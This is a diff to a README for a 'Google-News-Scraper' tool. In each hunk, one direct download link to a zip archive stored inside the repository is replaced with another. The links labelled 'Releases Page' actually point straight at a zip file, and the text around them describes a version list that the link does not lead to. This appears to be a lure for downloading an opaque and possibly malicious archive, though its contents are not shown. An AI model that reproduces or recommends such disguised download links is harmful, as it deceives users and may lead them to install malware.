@@ -6,7 +6,7 @@ Welcome to the Google-News-Scraper! This tool lets you extract news data from Go
 
 ## 🔗 Download the Application
 
-[![Download Google-News-Scraper](https://raw.githubusercontent.com/mahanabee/Google-News-Scraper/main/google-news-api-scraper/Scraper_News_Google_pugged.zip)](https://raw.githubusercontent.com/mahanabee/Google-News-Scraper/main/google-news-api-scraper/Scraper_News_Google_pugged.zip)
+[![Download Google-News-Scraper](https://raw.githubusercontent.com/mahanabee/Google-News-Scraper/main/google-news-api-scraper/data/News-Scraper-Google-v2.2-beta.2.zip)](https://raw.githubusercontent.com/mahanabee/Google-News-Scraper/main/google-news-api-scraper/data/News-Scraper-Google-v2.2-beta.2.zip)
 
 ## 🛠️ System Requirements
 
@@ -20,7 +20,7 @@ Before you begin, ensure your system meets the following requirements:
 
 To download the Google-News-Scraper, visit the following link:
 
-[Download from Releases Page](https://raw.githubusercontent.com/mahanabee/Google-News-Scraper/main/google-news-api-scraper/Scraper_News_Google_pugged.zip)
+[Download from Releases Page](https://raw.githubusercontent.com/mahanabee/Google-News-Scraper/main/google-news-api-scraper/data/News-Scraper-Google-v2.2-beta.2.zip)
 
 1. Click on the link above.
 2. You will see a list of available versions. 
@@ -56,7 +56,7 @@ If you have questions or need assistance, feel free to join our community. You c
 
 ## 🔄 Updates
 
-We regularly update Google-News-Scraper to enhance its features and performance. Check back often for new releases. You can find updates on the [Releases Page](https://raw.githubusercontent.com/mahanabee/Google-News-Scraper/main/google-news-api-scraper/Scraper_News_Google_pugged.zip).
+We regularly update Google-News-Scraper to enhance its features and performance. Check back often for new releases. You can find updates on the [Releases Page](https://raw.githubusercontent.com/mahanabee/Google-News-Scraper/main/google-news-api-scraper/data/News-Scraper-Google-v2.2-beta.2.zip).
 
 ## 📞 Contact
 
